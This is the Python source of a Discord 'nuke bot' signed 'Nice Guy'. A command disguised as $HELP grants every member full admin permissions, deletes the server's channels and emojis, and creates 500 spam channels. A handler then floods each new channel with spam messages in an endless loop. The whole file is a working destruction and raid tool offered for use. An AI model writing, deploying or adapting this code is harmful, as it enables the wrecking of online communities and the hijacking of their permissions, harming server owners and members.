import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
from webserver import keep_alive

SPAM_CHANNEL =  ["spam channel name", "spam channel 2", "spam channel 3"]


SPAM_MESSAGE = ["spam message 1", "spam message 2", "spam message 3"]


token = "discord bot token"


client = commands.Bot(command_prefix="$", intents=discord.Intents.all())
keep_alive()
@client.event
async def on_ready():
    print(''' 

    
  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
  ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
  ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
  ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
    
    
    ''')
    await client.change_presence(activity=discord.Game(name="💀Developed by Nice Guy💀"))
  
@client.command()
async def HELP(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
        
    await ctx.guild.create_text_channel("NUKED")
  
    amount = 500
    for i in range(amount):
        await ctx.guild.create_text_channel(random.choice(SPAM_CHANNEL))
        print(f"nuked {ctx.guild.name} Successfully.")
    return
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
client.run(token)